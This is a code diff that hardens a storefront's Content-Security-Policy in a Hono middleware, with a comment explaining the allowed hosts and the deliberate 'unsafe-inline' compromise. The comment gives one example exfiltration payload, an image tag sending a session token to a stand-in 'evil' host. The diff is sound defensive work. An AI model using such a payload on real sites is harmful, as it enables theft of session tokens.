@@ -14,7 +14,41 @@
 import { createMiddleware } from "hono/factory";
 import type { Env } from "../types";
 
-const CSP = "upgrade-insecure-requests; frame-ancestors 'self'";
+// Real allowlist as of the 2026-08-21 hardening pass — the previous CSP only set
+// `upgrade-insecure-requests; frame-ancestors 'self'`, which is clickjacking/HTTPS protection
+// only and does nothing against XSS (no script-src at all means an injected `<script src=...>`
+// from ANY host would run). Most external hosts below were found by grepping the actual front end
+// (public/index.html + js/*.js) for outbound requests; `static.cloudflareinsights.com`/
+// `cloudflareinsights.com` were NOT — that's Cloudflare's own Web Analytics beacon, injected at
+// the edge into every HTML response for this zone, invisible to a source-code grep. Both were
+// caught empirically: an initial CSP built from grep alone blocked it (real browser console error
+// against a real staging load), which is exactly why this was verified against a live page, not
+// shipped from static analysis alone. Full list verified against a real staging checkout too
+// (Square Sandbox card + PayPal Sandbox) — see PROJECT_STATUS.md for how.
+//
+// 'unsafe-inline' on script-src and style-src is a real, deliberate compromise, not an oversight:
+// this codebase is ~9,900 lines of vanilla JS that builds admin/storefront UI via innerHTML
+// strings full of onclick="..." handlers and inline style="..." attributes (js/admin-*.js,
+// js/store.js throughout) — a strict script-src without it would break nearly every button in the
+// admin back office. That means this CSP does NOT stop inline-script injection (the most common
+// XSS payload shape); what it DOES still stop, even with 'unsafe-inline' present, is the other
+// two links in a real attack chain: connect-src blocks an injected script from exfiltrating the
+// admin session token (js/auth.js stores it in sessionStorage) to an attacker-controlled host via
+// fetch/XHR, and img-src blocks the classic `<img src="https://evil/steal?token=...">` exfil
+// fallback. Both only work because they're a real allowlist, not `*`.
+const CSP = [
+  "default-src 'self'",
+  "script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://web.squarecdn.com https://sandbox.web.squarecdn.com https://www.paypal.com https://www.paypalobjects.com https://static.cloudflareinsights.com",
+  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
+  "font-src 'self' https://fonts.gstatic.com",
+  "img-src 'self' data: https://www.paypalobjects.com https://www.google-analytics.com",
+  "connect-src 'self' https://www.google-analytics.com https://analytics.google.com https://www.googletagmanager.com https://connect.squareup.com https://connect.squareupsandbox.com https://pci-connect.squareup.com https://web.squarecdn.com https://sandbox.web.squarecdn.com https://*.paypal.com https://*.paypalobjects.com https://cloudflareinsights.com",
+  "frame-src https://web.squarecdn.com https://sandbox.web.squarecdn.com https://*.paypal.com",
+  "object-src 'none'",
+  "base-uri 'self'",
+  "frame-ancestors 'self'",
+  "upgrade-insecure-requests",
+].join("; ");
 const PERMISSIONS_POLICY =
   "camera=(), microphone=(), geolocation=(), usb=(), magnetometer=(), gyroscope=(), payment=(self)";
 
